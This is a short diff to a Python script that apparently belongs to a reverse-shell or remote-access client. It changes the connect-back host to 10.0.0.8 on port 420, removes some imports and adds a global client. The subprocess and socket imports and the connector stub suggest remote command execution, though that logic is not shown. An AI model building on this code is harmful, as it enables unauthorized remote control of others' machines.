@@ -1,15 +1,14 @@
 import socket as s
 from subprocess import check_output, call
 from time import sleep
-from sys import exit, executable, argv
+from sys import exit
 from random import randint
 from os import getlogin
 import threading
-import ctypes
 
-HOST = "10.0.0.5"
+HOST = "10.0.0.8"
 PORT = 420
-BUFFER = 1024
+BUFFER = 4096
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
 
@@ -21,6 +20,8 @@ a0001 = threading.Thread(target=a0001)
 a0001.start()
 
 """
+
+global client
 
 
 def connector():
